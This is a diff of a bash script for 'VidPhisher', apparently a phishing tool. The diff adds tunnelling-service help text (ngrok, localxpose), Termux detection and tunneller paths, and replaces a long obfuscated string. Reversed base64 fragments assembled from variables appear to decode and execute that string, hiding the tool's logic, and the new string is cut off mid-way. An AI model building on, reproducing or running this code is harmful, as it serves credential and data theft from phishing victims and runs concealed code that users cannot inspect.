@@ -126,6 +126,23 @@ ${yellow}   \_/  |_|\__,_|_|   |_| |_|_|___/_| |_|\___|_|
 ${red}                                          [v${version}] 
 ${blue}                                  [By KasRoudra] 
 "
+
+ngrok_help="
+${info}Steps: ${nc}
+${blue}[1]${yellow} Go to ${green}https://ngrok.com
+${blue}[2]${yellow} Create an account 
+${blue}[3]${yellow} Login to your account
+${blue}[4]${yellow} Visit ${green}https://dashboard.ngrok.com/get-started/your-authtoken${yellow} and copy your authtoken
+"
+
+loclx_help="
+${info}Steps: ${nc}
+${blue}[1]${yellow} Go to ${green}https://localxpose.io
+${blue}[2]${yellow} Create an account 
+${blue}[3]${yellow} Login to your account
+${blue}[4]${yellow} Visit ${green}https://localxpose.io/dashboard/access${yellow} and copy your authtoken
+"
+
 # Check for sudo
 if command -v sudo > /dev/null 2>&1; then
     sudo=true
@@ -133,31 +150,39 @@ else
     sudo=false
 fi
 
-# Check if mac
+
+# Check if mac or termux
+termux=false
+brew=false
+ngrok=false
+cloudflared=false
+loclx=false
+ngrok_command="$tunneler_dir/ngrok"
+cf_command="$tunneler_dir/cloudflared"
+loclx_command="$tunneler_dir/loclx"
+if [[ -d /data/data/com.termux/files/home ]]; then
+    termux=true
+    ngrok_command="termux-chroot $tunneler_dir/ngrok"
+    cf_command="termux-chroot $tunneler_dir/cloudflared"
+    loclx_command="termux-chroot $tunneler_dir/loclx"
+fi
 if command -v brew > /dev/null 2>&1; then
     brew=true
     if command -v ngrok > /dev/null 2>&1; then
         ngrok=true
-    else
-        ngrok=false
+        ngrok_command="ngrok"
     fi
     if command -v cloudflared > /dev/null 2>&1; then
         cloudflared=true
-    else
-        cloudflared=false
+        cf_command="cloudflared"
     fi
     if command -v localxpose > /dev/null 2>&1; then
         loclx=true
-    else
-        loclx=false
+        loclx_command="localxpose"
     fi
-else
-    brew=false
-    ngrok=false
-    cloudflared=false
-    loclx=false
 fi
 
+vp_prompt="\n${cyan}Vid${nc}@${cyan}Phisher ${red}$ ${nc}"
 
 # Kill running instances of required packages
 killer() {
@@ -213,18 +238,10 @@ trap "echo -e '\n${success}Thanks for using!\n'; exit" 2
 echo -e "\n${info}Please Wait!...\n${nc}"
 
 
-gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=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' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
+gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=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